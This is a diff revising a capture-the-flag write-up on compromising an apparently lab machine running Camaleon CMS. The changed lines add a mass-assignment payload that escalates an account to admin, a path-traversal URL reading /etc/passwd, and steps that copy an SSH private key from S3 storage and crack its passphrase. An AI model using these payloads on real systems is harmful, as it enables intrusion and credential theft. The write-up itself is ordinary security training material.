@@ -58,7 +58,7 @@ searchsploit camaleon
 - CVE-2023-30145 — SSTI in `formats`, patched in 2.9.0.
 - CVE-2024-46987 — authenticated path traversal / file read.
 - CVE-2024-46986 — arbitrary write, blocked in 2.9.0.
-- CVE-2025-2304 — client-to-admin escalation plus S3 credential extraction.
+- CVE-2025-2304 — **mass assignment** on the user update endpoint: adding `user[role]=admin` to the password-change request promotes the account and exposes the panel's S3 credentials.
 
 ## Foothold
 
@@ -84,6 +84,7 @@ LFI to read the system:
 
 ```bash
 python3 CVE-2024-46987.py -u http://facts.htb -l aaa -p bbb /etc/passwd
+# the real endpoint is /admin/media/download_private_file?file=../../../../../../etc/passwd
 ```
 
 ```text
@@ -91,7 +92,7 @@ trivia:x:1000:1000:...
 william:x:1001:1001:...
 ```
 
-The key belongs to `trivia` (confirmed with `ssh-keygen -y` against `authorized_keys`) and the user flag sits in her home. The LFI is for reading the host and its files, not the flag.
+The key belongs to `trivia` (the `trivia@facts.htb` comment and `ssh-keygen -y` confirm it). The LFI reaches the same home, so it also reads the user flag without going through MinIO.
 
 ## Lateral movement
 
@@ -117,7 +118,7 @@ AWS_ACCESS_KEY_ID=<key> AWS_SECRET_ACCESS_KEY='<secret>' \
 ```bash
 aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .
 ssh2john id_ed25519 > key.hash
-john key.hash --wordlist=/usr/share/wordlists/rockyou.txt
+john key.hash --wordlist=/usr/share/wordlists/rockyou.txt   # dictionary passphrase
 ```
 
 To identify the owner:
